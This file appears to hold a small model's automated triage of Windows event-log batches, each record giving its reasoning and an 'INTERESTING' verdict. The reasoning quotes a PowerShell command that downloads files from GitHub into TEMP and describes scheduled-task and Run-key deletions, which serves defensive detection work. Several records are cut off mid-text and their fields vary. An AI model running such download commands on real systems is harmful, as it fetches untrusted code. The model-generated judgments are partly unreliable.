{"file":"filtering\/phi4-mini\/attack\/20250411_180121.jsonl","analysis":"<think>\nAlright, let's dive into this log analysis. So, I'm looking at a batch of events here, all in JSONL format. Each line is a separate event with process info, Windows logs, and sometimes file details.\n\nFirst off, I notice that the first few events are from chrome.exe. They're doing DNS queries and network connections. That's pretty standard for a browser, especially when navigating the web. Nothing too suspicious there on its own.\n\nBut then things get more interesting starting around the 5th event. There's a process named powershell.exe being spawned. The command line looks fishy—it's using Powershell to download files from GitHub repositories. Specifically, lines like:\n\npowershell.exe & {(New-Object System.Net.WebClient).DownloadFile(\"https:\/\/raw.githubusercontent.com\/...\", \"$env:TEMP...\")}\n\nThis is a red flag because downloading files directly from the internet can be a common technique for malicious actors. Also, multiple downloads to different temp files with varying names—like modulo_padrao.txt, unidade_ativo.txt, etc.—suggest automated or script-driven activity.\n\nLooking further, there are several FileCreate and FileDelete events related to these temporary files. The fact that the file is created and then deleted might be an attempt to erase evidence, but it's logged here so we can still see it happened.\n\nAdditionally, there are Registry value sets from both chrome.exe and powershell.exe. While Chrome accessing the registry isn't uncommon, the combination with Powershell's activity makes me think this could be part of a persistence mechanism or privilege escalation.\n\nThe events where Powershell accesses images (clr.dll, mscoreei.dll) might indicate it's executing code that requires certain .NET components, which is another behavior that raises suspicion. Also, the 'Pipe Created' event from Powershell could be for communication with other processes or to maintain a backdoor.\n\nAnother point is the multiple instances of downloading files to different locations in the TEMP directory. This kind of varied activity isn't typical user behavior and might indicate a script trying different methods to avoid detection.\n\nMoreover, the command lines are similar but not identical across events. Each download points to a slightly different GitHub path, which could be an attempt to spread out the malicious activities or test different endpoints for availability.\n\nConsidering all these together—the Powershell downloads, file creations\/deletions, registry changes, and image loading—it's clear that this batch shows signs of potentially malicious activity. The repeated use of Powershell to download files from repositories is a classic indicator of malware or script execution. While there's no direct evidence of harm here, the pattern strongly suggests an attack vector.\n\nSo, putting it all together, this batch is definitely worth investigating further. There are multiple indicators that point towards possible malicious intent, and ignoring them could leave the system at risk.\n<\/think>\n\n```json\n{\n  \"CLASSIFICATION\": \"INTERESTING\",\n  \"JUSTIFICATION\": \"The batch contains multiple events involving Powershell.exe downloading files from GitHub repositories to temporary locations, which may indicate potential malicious activity.

{"file":"filtering\/phi4-mini\/attack\/20250411_180121.jsonl","analysis":"<think>\nAlright, let's dive into this. I'm seeing a bunch of events here that I need to analyze as a whole to decide if they're interesting or not for investigation.\n\nFirst off, there are multiple entries where Chrome.exe is setting registry values. That's a bit odd because Chrome doesn't usually do much with the registry beyond its own settings. Three times in a row makes me wonder if something is trying to persist across sessions or maybe altering system configurations in an unusual way.\n\nThen I notice PowerShell being used extensively. The command line shows some activities like downloading files from GitHub and saving them to the TEMP directory. That's a red flag because downloading files from random sites can indicate malicious activity, especially when it's done via PowerShell, which is often abused by attackers for scripting and execution.\n\nLooking at the file paths mentioned in the logs, there's a reference to MpClient.dll under Windows Defender. I'm not entirely sure if that's suspicious on its own, but combined with other actions, it could be part of some attempt to disguise malicious activities as legitimate system processes.\n\nThere are also multiple instances where powershell.exe is accessing files and registry values. This activity seems out of the ordinary unless the user is performing a lot of manual script executions, which isn't typical for most users. The repeated RegistryEvent tasks make me think that something might be trying to set or modify registry keys in a way that could allow persistence or elevate privileges.\n\nAnother point of interest is the use of cmd.exe with specific command-line arguments involving SCHTASKS. That's theScheduled Tasks utility, and deleting a task named \"spawn\" without any apparent reason suggests an attempt to remove something from the system's task scheduler. This could be part of an attack chain where malicious tasks are created and later removed if detected.\n\nAdditionally, there are events involving processes like conhost.exe and winlogbeat.exe creating files or accessing registry values. These might not seem suspicious at first glance, but when combined with other actions, they add up to a pattern that looks more coordinated than normal user activity.\n\nI'm also noting the use of whoami.exe, which is typically used to check user permissions. If this is part of an automated process, it could be testing for privileges or checking system information as part of a larger plan.\n\nPutting all these pieces together, the batch shows several indicators that could point towards malicious behavior: downloading files from external sources, deleting scheduled tasks, multiple registry modifications with potentially malicious scripts, and activities that might be attempting to cover tracks. These actions collectively create a concerning pattern that goes beyond normal user behavior.\n\nHowever, without more context on whether this is during an active investigation or part of legitimate system operations, it's hard to be certain. But given the combination of events, especially the PowerShell script downloads and task deletions, I'd lean towards classifying this batch as interesting for further investigation.\n<\/think>\n\n```json\n{\n  \"CLASSIFICATION\": \"INTERESTING\",\n  \"JUSTIFICATION\": \"The batch contains multiple registry modifications by Chrome.exe, extensive use of PowerShell with suspicious command lines including downloading files from external sources and deleting tasks, which may indicate malicious activity.\",\n  \"score\": 85\n}\n```"}
{"file":"filtering\/phi4-mini\/attack\/20250411_180121.jsonl","analysis":"<think>\nOkay, so I need to analyze this batch of system events to determine if they're interesting for investigation. Let me go through each event step by step.\n\nFirst, looking at the events, I see several process creations and file operations. The first event is about 'schtasks.exe' being used with a command line that deletes a task named 'spawn'. That's a bit concerning because schtasks is often used for scheduling tasks, and deleting a task could be part of malicious activity to remove traces.\n\nNext, there are multiple events involving 'cmd.exe', 'powershell.exe', 'whoami.exe', and 'reg.exe'. These tools can be used both legitimately and maliciously. For example, using reg.exe to delete registry entries might be part of uninstalling a program or removing persistence mechanisms used by malware. I notice that the command lines for these processes sometimes involve deleting specific registry keys under HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run, like 'modulo_temporario' and 'pacote_auxiliar'. These keys are typically where Windows stores the names of programs to run at startup. Malware often uses such keys to ensure it runs on each boot, so deleting them might be an attempt to remove persistence.\n\nAdditionally, there's an event where 'powershell.exe' is called with an empty command line: '& {}'. That looks suspicious because it might indicate that PowerShell was executed without any visible commands, which could mean that the actual command was passed through other means or perhaps via a script. Empty command lines can be a red flag for lateral movement or executing malicious scripts.\n\nLooking at the file events, most of them are related to system files being loaded by powershell.exe, like mscoree.dll and others. While these are legitimate system files, the repeated loading might suggest that PowerShell is executing code in an environment that requires these components, which could be normal but might also warrant closer inspection if combined with other suspicious activities.\n\nI also see multiple instances of processes accessing each other (ProcessAccess events) and image loads. These could be part of legitimate operations, but when combined with the deletion of tasks and registry entries, they add to the concern that something is trying to cover its tracks or remove persistence mechanisms.\n\nConsidering all these events together, it seems like there's a sequence of actions involving known tools (cmd, powershell, schtasks, reg) being used in ways that could be indicative of malicious behavior. The deletion of scheduled tasks and registry entries for startup programs stands out as potential signs of an attacker trying to clean up after themselves or remove competing malware.\n\nHowever, it's also possible that a system administrator is performing maintenance, deleting old tasks or removing unnecessary registry entries. Without more context, like timestamps showing if these events occurred over a short period or in a pattern typical of attacks, it's hard to be certain. But given the combination of process creations with potentially malicious command lines and deletions of persistence mechanisms, I lean towards classifying this batch as interesting for investigation.\n<\/think>\n\n```json\n{\n  \"CLASSIFICATION\": \"INTERESTING\",\n  \"JUSTIFICATION\": \"The events show multiple instances of system tools (cmd.exe, powershell.exe, schtasks.exe) being used with potentially malicious commands, such as deleting tasks and registry entries. This could indicate an attempt to remove persistence mechanisms or cover tracks.\",\n  \"REASONING\": \"The batch includes deletions of scheduled tasks and registry keys often targeted by malware for persistence. Suspicious use of powershell.exe and other tools adds concern.\"\n}\n```"}

PowerShell is commonly used for legitimate administrative tasks but can also be abused in attacks. The fact that it's appearing so frequently raises some flags.\n\nLooking at the specific events:\n- There are several file operations: a file being created and then deleted, which could indicate an attempt to remove traces of malicious activity.\n- Registry modifications are present, like setting registry values. This is concerning because attackers often use registry changes to maintain persistence or alter system configurations.\n\nI also see that some entries mention 'winlogbeat.exe', which I recognize as a legitimate tool for collecting and forwarding log data. However, when paired with other suspicious activities, it might not be out of place in an attack scenario where logs are being monitored or altered.\n\nAnother point is the repeated use of 'cmd.exe' and 'conhost.exe'. While these are standard command-line tools, their presence alongside PowerShell activity could be part of a chain of attacks, such as executing commands or moving laterally within a network.\n\nThe events involving 'whoami.exe' might be attempting to gather user information. This is a common technique in reconnoissance or lateral movement phases of an attack.\n\nI also notice multiple entries where tasks are related to process creation and access, which could indicate process injection or the spawning of new processes for malicious purposes.\n\nConsidering all these points together, the combination of numerous PowerShell executions, file deletions, registry changes, and other potentially suspicious activities suggests a possible attack.

{"file":"filtering\/phi4-mini\/attack\/20250411_180121.jsonl","analysis":"<think>\nAlright, let me try to figure out whether this batch of logs is interesting or not. So, I'm given a series of events in JSONL format, each line being a separate event. My task is to analyze all these events together and decide if they're worth investigating.\n\nLooking at the first few events, I see that 'powershell.exe' is involved multiple times. It's loading various DLL files like clrjit.dll, MpOAV.dll, etc. Then there are file creation and deletion events related to a PowerShell script in the Temp directory. The script name __PSScriptPolicyTest_xp2ayoai.hh4.ps1 seems suspicious because it's trying to create and then delete itself quickly, which is a common tactic for malicious scripts to avoid detection.\n\nThere's also activity from 'chrome.exe' where it's setting registry values multiple times. While Chrome can modify the registry for updates or settings, repeated writes without clear purpose might be concerning, but I'm not sure if this alone is suspicious.\n\nAnother event shows 'whoami.exe' being executed with a command line argument to get user information. This could be part of legitimate system administration tasks, but it's also commonly used by attackers to gather information about the system.\n\nThe last few events again involve powershell.exe accessing other processes and setting registry values, which seems repetitive and possibly unnecessary for normal operations. The use of 'powershell.exe' with command lines that include script removal (like Remove-Item) in the event where a process is created suggests an attempt to delete files or logs to cover tracks.\n\nPutting it all together, there's a pattern of PowerShell activities that are not typical user actions. The repeated file operations, registry modifications, and process accesses could indicate malicious behavior such as persistence mechanisms or data exfiltration. Additionally, the deletion of temporary script files might be an attempt to remove evidence.\n\nI'm fairly confident because multiple events point towards potential malicious activity, but I can't be 100% certain without more context. However, the combination of these actions is enough to consider this batch as interesting for further investigation.\n<\/think>\n\n```json\n{\n  \"CLASSIFICATION\": \"INTERESTING\",\n  \"JUSTIFICATION\": \"Multiple suspicious activities involving powershell.exe, including file creation\/deletion in temporary directories and registry modifications, indicate potential malicious behavior.\",\n  \"CONFIDENCE\": 0.85\n}\n```"}

I'm looking at a batch of system log events and need to determine if they're interesting for investigation. \n\nFirst, I notice that there are multiple entries related to powershell.exe being executed with commands to remove files in the TEMP directory. This is concerning because PowerShell is often used by attackers for malicious activities, especially file deletions which can be part of data exfiltration or destruction.\n\nLooking deeper, several events show the creation and deletion of specific files like __PSScriptPolicyTest_1fin0tvz.r52.ps1. The fact that a script is created and then deleted quickly might indicate an attempt to avoid detection by leaving minimal traces on disk.\n\nAdditionally, there are multiple calls using Remove-Item against various .zip files in the TEMP directory. These repeated deletions could be part of a larger script attempting to clean up evidence or remove malicious payloads after execution.\n\nI also see that some events log registry changes and image loads, which might suggest attempts to persist across reboots or load malicious components. The involvement of whoami.exe is another red flag because it's often used to check user privileges, which could be a precursor to more aggressive actions.\n\nConsidering all these activities together—file deletions, script execution, and potential persistence mechanisms—it seems like this batch shows signs of potentially malicious behavior.

{"file":"filtering\/phi4-mini\/attack\/20250411_180121.jsonl","analysis":"<think>\nOkay, I'm looking at this batch of system logs. Let me try to make sense of them.\n\nFirst, I see a lot of events related to PowerShell. The user is running various commands using powershell.exe. For example, there are multiple instances where PowerShell accesses processes, sets registry values, and loads images. That's normal for scripts but could be suspicious if it's unexpected activity.\n\nThen, I notice some file operations: creating temporary files in the AppData\\Local\\Temp directory, like '__PSScriptPolicyTest_v24whope.fom.ps1', and then deleting them shortly after. This behavior might indicate that a script is being tested or perhaps dropped and removed quickly to avoid detection. The fact that these files are created and deleted within the same process makes me think of potential malicious activity, like a file-less malware or script execution.\n\nLooking further, there's a command line showing specific file deletions in the TEMP directory: removing 'registro_auxiliar.txt', 'registro_comum.txt', etc. These actions could be part of a larger script trying to clean up traces of its activities. Deleting files without user interaction might raise red flags, especially if these files are legitimate system files.\n\nThere's also an event from winlogbeat.exe creating a configuration file. That seems benign since it's likely related to log shipping or monitoring tools.\n\nThen there's a process creation of whoami.exe. While this is a common tool for checking user permissions, the lack of context here makes me wonder if it's part of a larger script or used maliciously to gather information.\n\nAnother point is the repeated registry modifications by both PowerShell and Chrome. Chrome modifying the registry isn't unusual, but multiple events without clear purpose could indicate something else. However, since many are from Chrome, which sometimes logs such events during updates or configuration changes, this might not be suspicious on its own.\n\nPutting it all together, the batch shows a lot of activity tied to PowerShell executing scripts and deleting files. The temporary file creation and deletion pattern is concerning because it can be a sign of a script trying to avoid being detected by security tools or attempting to erase evidence. While some activities are benign, the combination suggests potential malicious behavior that could warrant further investigation.\n\nI'm confident enough to classify this as interesting due to the unusual file operations and repeated deletions in the TEMP directory, which might indicate an attempt to cover tracks.\n<\/think>\n\n```json\n{\n  \"CLASSIFICATION\": \"INTERESTING\",\n  \"JUSTIFICATION\": \"The batch contains multiple PowerShell events indicating file creation, deletion, and registry modifications.

{"file":"filtering\/phi4-mini\/attack\/20250411_180121.jsonl","analysis":"<think>\nAlright, I'm looking at this batch of events to determine if it's interesting from a cybersecurity perspective. Let me go through each event one by one and see what patterns emerge.\n\nThe first few entries are from chrome.exe setting registry values. That's normal because Chrome often adjusts settings through the registry. Then there's RuntimeBroker.exe doing the same, which is also typical for Windows processes. Nothing suspicious here yet.\n\nNext, I notice multiple events involving powershell.exe accessing processes. PowerShell is a powerful tool that can be used maliciously, but just accessing processes might not always be bad—it could be legitimate admin activity or part of automated scripts. However, the frequency here is notable; there are several ProcessAccess events for PowerShell, which might warrant closer look.\n\nThen there are multiple instances of whoami.exe being executed. Whoami is usually harmless and used to check user information. But seeing it multiple times could indicate testing permissions or lateral movement in a network. That's something to consider.\n\nLooking further, there are FileCreate events from winlogbeat.exe creating a config file and powershell.exe creating another file named pacote_ativo.txt. Winlogbeat is likely an ELK component for log management, so its activity is expected. The new file created by PowerShell might be suspicious—if it's part of malicious scripting, that could be a red flag.\n\nPutting it all together: multiple registry writes from different processes, repeated use of PowerShell accessing processes, and the creation of files by PowerShell. While individually these events aren't necessarily malicious, the combination—especially the extensive use of PowerShell with process accesses and file creation—could indicate potential malicious activity such as script execution or persistence mechanisms.\n\nI'm leaning towards classifying this batch as INTERESTING because the cumulative behavior raises flags that could be signs of an attack. The confidence is around 0.8 because while each event isn't conclusive on its own, their combination suggests possible malicious intent.\n<\/think>\n\n```json\n{\n  \"CLASSIFICATION\": \"INTERESTING\",\n  \"JUSTIFICATION\": \"The batch shows multiple process creations and accesses by powershell.exe, which could indicate potential malicious activity or script execution.\",\n  \"CONFIDENCE\": 0.8\n}\n```"}
